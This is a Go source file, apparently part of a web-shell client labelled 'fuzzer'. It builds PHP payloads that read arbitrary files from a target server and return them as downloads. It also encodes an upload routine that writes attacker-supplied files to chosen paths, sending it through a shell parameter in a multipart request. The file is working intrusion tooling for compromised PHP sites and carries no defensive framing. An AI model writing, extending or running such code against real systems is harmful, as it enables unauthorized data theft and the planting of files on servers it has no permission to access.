package fuzzer

import (
	"bytes"
	"fmt"
	"io"
	"mime/multipart"
	"os"
	"path/filepath"
)

var PHP = PHPInterface{}

type PHPInterface struct{}

func (p *PHPInterface) buildHeader(dir string) string {
	var headers [8]string

	headers[0] = "header('Content-Description: File Transfer');"
	headers[1] = "header('Content-Type: application/octet-stream');"
	headers[2] = "header('Content-Disposition: attachment; filename='.basename('" + dir + "'));"
	headers[3] = "header('Content-Transfer-Encoding: binary');"
	headers[4] = "header('Expires: 0');"
	headers[5] = "header('Cache-Control: must-revalidate, post-check=0, pre-check=0');"
	headers[6] = "header('Pragma: public');"
	headers[7] = "header('Content-Length: ' . filesize('" + dir + "'));"

	var str string

	for _, header := range headers {
		str = str + header
	}

	return str
}

func (p *PHPInterface) Raw(r string) string {
	raw := r + FORMATER.Response()
	return raw
}

func (p *PHPInterface) Download(dir string) string {
	c1 := "if (file_exists('" + dir + "')) {"
	c2 := "}"
	headers := p.buildHeader(dir)
	ob := "ob_clean();flush();readfile('" + dir + "');exit();"

	php := c1 + headers + ob + c2

	return php
}

func (p *PHPInterface) Upload(path, dir string) (*bytes.Buffer, string, bool) {
	php := "$file=$_FILES['file'];move_uploaded_file($file['tmp_name'], '" + dir + "');if(file_exists('" + dir + "')){echo 1;}"
	php = Encode(php)

	file, err := os.Open(path)
	if err != nil {
		fmt.Println("Can't open file")
		fmt.Println(err)
		return nil, "", true
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, err := writer.CreateFormFile("file", filepath.Base(path))
	if err != nil {
		fmt.Println("Can't create part")
		fmt.Println(err)
		return nil, "", true
	}

	_, err = io.Copy(part, file)

	writer.WriteField(NET.GetParameter(), php)

	err = writer.Close()
	if err != nil {
		fmt.Println("Can't close")
		fmt.Println(err)
		return nil, "", true
	}

	return body, writer.FormDataContentType(), false
}
